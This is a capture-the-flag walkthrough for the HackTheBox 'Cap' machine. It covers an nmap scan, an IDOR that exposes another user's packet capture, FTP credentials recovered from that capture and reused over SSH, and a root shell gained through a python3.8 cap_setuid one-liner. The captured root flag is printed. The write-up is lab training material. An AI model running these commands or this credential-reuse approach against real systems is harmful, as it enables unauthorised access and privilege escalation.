---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Linux
  - Wireshark
  - FTP
---
# Overview

| Name        | Code     |
| ----------- | -------- |
| OS          | Linux    |
| Base Points | Easy [0] |
| Status      | Done     |

---
# Recon
## Nmap

```bash
~/Hentai/HTB/cap ❯ sudo nmap -sC -sV -vv cap.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-15 11:34 +0545
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:34
Completed NSE at 11:34, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:34
Completed NSE at 11:34, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:34
Completed NSE at 11:34, 0.00s elapsed
Initiating Ping Scan at 11:34
Scanning cap.htb (10.10.10.245) [4 ports]
Completed Ping Scan at 11:34, 2.33s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:34
Scanning cap.htb (10.10.10.245) [1000 ports]
Discovered open port 21/tcp on 10.10.10.245
Discovered open port 22/tcp on 10.10.10.245
Discovered open port 80/tcp on 10.10.10.245
Completed SYN Stealth Scan at 11:34, 6.00s elapsed (1000 total ports)
Initiating Service scan at 11:34
Scanning 3 services on cap.htb (10.10.10.245)
Stats: 0:01:29 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 11:36 (0:00:40 remaining)
Completed Service scan at 11:36, 129.10s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.10.245.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:36
Completed NSE at 11:36, 29.57s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:36
Completed NSE at 11:36, 3.39s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:36
Completed NSE at 11:36, 0.00s elapsed
Nmap scan report for cap.htb (10.10.10.245)
Host is up, received timestamp-reply ttl 63 (0.32s latency).
Scanned at 2025-06-15 11:34:07 +0545 for 168s
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 
80/tcp open  http    syn-ack ttl 63 gunicorn
| http-methods:
|_  Supported Methods: HEAD OPTIONS GET
|_http-title: Security Dashboard
|_http-server-header: gunicorn
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Sun, 15 Jun 2025 05:49:29 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest:
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Sun, 15 Jun 2025 05:49:21 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     <!DOCTYPE html>
|     <html class="no-js" lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Security Dashboard</title>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">
|     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
|     <link rel="stylesheet" href="/static/css/font-awesome.min.css">
|     <link rel="stylesheet" href="/static/css/themify-icons.css">
|     <link rel="stylesheet" href="/static/css/metisMenu.css">
|     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
|     <link rel="stylesheet" href="/static/css/slicknav.min.css">
|     <!-- amchar
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Sun, 15 Jun 2025 05:49:22 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, OPTIONS, GET
|     Content-Length: 0
|   RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
|     </body>
|_    </html>

Nmap done: 1 IP address (1 host up) scanned in 171.21 seconds
           Raw packets sent: 1170 (51.432KB) | Rcvd: 1021 (40.852KB)
```
# Enumeration
## 80 Site

- `http://cap.htb/data/13` We can download PCAP but it has IDOR because if we try `http://cap.htb/data/0` It gives us access.
- Since `13` is our `nathan` current data if we can access `nathan` first data of PCAP.
- Tried all possible lowest we can get is `http://cap.htb/data/0` so this is first PCAP file.
## PCAP Analysis

![[ftp.png]]

- Got creds of FTP `nathan:Buck3tH4TF0RM3!`
## FTP Login

```bash
~/Hentai/HTB/cap 3m 8s ❯ ftp cap.htb
Connected to cap.htb.
220 (vsFTPd 3.0.3)
Name (cap.htb:at0m): nathan
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||32467|)
150 Here comes the directory listing.
-rw-rw-r--    1 1001     1001       285797 Jun 14 18:23 CVE-2022-2588
-rw-rw-r--    1 1001     1001          100 Jun 14 19:34 escalar.py
-rw-rw-r--    1 1001     1001        23024 Jun 14 18:15 exploit.c
-rwxrwxr-x    1 1001     1001       840139 Jun 14 14:59 linpeas.sh
-rw-rw-r--    1 1001     1001            0 Jun 14 19:15 linpeas.sh.1
-rw-rw-r--    1 1001     1001            0 Jun 14 19:19 linpeas.sh.2
-rw-rw-r--    1 0        1001            0 Jun 14 19:48 server.py
drwxr-xr-x    3 1001     1001         4096 Jun 14 14:59 snap
-r--------    1 1001     1001           33 Jun 14 07:56 user.txt
226 Directory send OK.
ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||9060|)
150 Opening BINARY mode data connection for user.txt (33 bytes).
100% |******************************|    33      257.81 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.09 KiB/s)
ftp>
```
# Exploitation
## Since SSH Is Open Trying Creds in SSH Too (Password Spraying)

- `ssh nathan@cap.htb`
- It does work.
# Privilege Escalation
## Using Getcap to Find Vulnerabilities

```bash
nathan@cap:~$ sudo -l
[sudo] password for nathan:
Sorry, user nathan may not run sudo on cap.
nathan@cap:~$ ls
CVE-2022-2588  exploit.c   linpeas.sh.1  server.py  user.txt
escalar.py     linpeas.sh  linpeas.sh.2  snap
nathan@cap:~$ getcap
usage: getcap [-v] [-r] [-h] [-n] <filename> [<filename> ...]

        displays the capabilities on the queried file(s).
```

- The `getcap` command is a utility in Linux used to examine the file capabilities of a specified file. File capabilities are a way to grant specific privileges to a program without giving it full root access, enhancing system security.When you run `getcap`, it displays the name and capabilities of each specified file.

```bash
nathan@cap:~$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

- Shows `Python3.8` can be use to abuse it.
## Abusing for Root using Python

- We can find from [GTFOBINS](https://gtfobins.github.io/gtfobins/python/?source=post_page-----eb9c97f2259c---------------------------------------#capabilities) on how to do it.

```bash
nathan@cap:~$ python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# ls
CVE-2022-2588  exploit.c   linpeas.sh.1  server.py  user.txt
escalar.py     linpeas.sh  linpeas.sh.2  snap
# cd /root
# ls
root.txt  snap
# cat root.txt
70ad380c3dfb6b41cb9d4c19db28081c
```

---


